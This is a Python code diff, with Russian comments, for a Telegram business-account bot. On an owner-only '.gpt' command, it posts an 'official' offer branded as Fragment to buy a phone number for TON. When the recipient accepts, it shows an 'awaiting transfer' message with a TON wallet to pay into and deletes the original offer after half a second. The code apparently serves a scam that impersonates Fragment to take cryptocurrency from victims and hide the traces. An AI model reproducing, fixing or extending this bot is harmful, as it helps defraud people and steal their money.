@@ -16,10 +16,14 @@ CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
 
+# Функция безопасного удаления
 async def safe_delete(chat_id, message_id, conn_id=None):
     if conn_id:
         try:
-            await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[message_id])
+            await bot.delete_business_messages(
+                business_connection_id=conn_id,
+                message_ids=[message_id]
+            )
             return
         except Exception:
             pass
@@ -28,6 +32,7 @@ async def safe_delete(chat_id, message_id, conn_id=None):
     except Exception:
         pass
 
+# --- ОБРАБОТЧИК КОМАНДЫ .gpt ---
 @dispatcher.business_message(F.text.startswith(".gpt"))
 async def send_offer(message: Message):
     if not message.business_connection_id:
@@ -42,6 +47,7 @@ async def send_offer(message: Message):
     if message.from_user.id != owner_id:
         return
 
+    # Парсинг
     text_clean = message.text.replace(".gpt", "").replace(" ", "").strip()
     
     phone_match = re.search(r"\+(\d+)", text_clean)
@@ -66,7 +72,7 @@ async def send_offer(message: Message):
     amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
-    # НОВЫЙ ОФИЦИАЛЬНЫЙ ТЕКСТ
+    # Официальный текст оффера
     offer_text = (
         f"<b>Fragment</b>\n"
         f"<b>Buy {formatted_phone}</b>\n\n"
@@ -101,13 +107,10 @@ async def send_offer(message: Message):
         except:
             pass
 
+# --- ОБРАБОТЧИК "ПРИНЯТЬ" ---
 @dispatcher.callback_query(F.data == "accept_offer")
 async def on_accept_offer(callback: CallbackQuery):
-    # Удаляем сообщение с оффером
-    try:
-        await callback.message.delete()
-    except Exception as e:
-        print(f"Ошибка удаления: {e}")
+    conn_id = callback.message.business_connection_id
 
     new_text = (
         f"<b>Ожидание перевода</b>\n\n"
@@ -126,26 +129,31 @@ async def on_accept_offer(callback: CallbackQuery):
         [InlineKeyboardButton(text="Скопировать кошелек", callback_data="copy_wallet")]
     ])
 
+    # 1. Отправляем новое сообщение
     try:
-        await callback.bot.send_message(
+        await bot.send_message(
             chat_id=callback.message.chat.id,
             text=new_text,
             reply_markup=new_keyboard,
-            business_connection_id=callback.message.business_connection_id
+            business_connection_id=conn_id
         )
     except Exception as e:
         print(f"Ошибка отправки: {e}")
-        
+
+    # 2. Ждем полсекунды и жестко удаляем старое
+    await asyncio.sleep(0.5)
+    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
+
     await callback.answer()
 
+# --- ОБРАБОТЧИК "ОТКЛОНИТЬ" ---
 @dispatcher.callback_query(F.data == "decline_offer")
 async def on_decline(callback: CallbackQuery):
-    try:
-        await callback.message.delete()
-    except Exception as e:
-        print(f"Ошибка удаления: {e}")
+    conn_id = callback.message.business_connection_id
+    await safe_delete(callback.message.chat.id, callback.message.message_id, conn_id)
     await callback.answer("Вы отклонили предложение.", show_alert=True)
 
+# --- КОПИРОВАНИЕ КОШЕЛЬКА ---
 @dispatcher.callback_query(F.data == "copy_wallet")
 async def on_copy_wallet(callback: CallbackQuery):
     await callback.answer(f"Кошелек скопирован: {TON_WALLET}", show_alert=True)
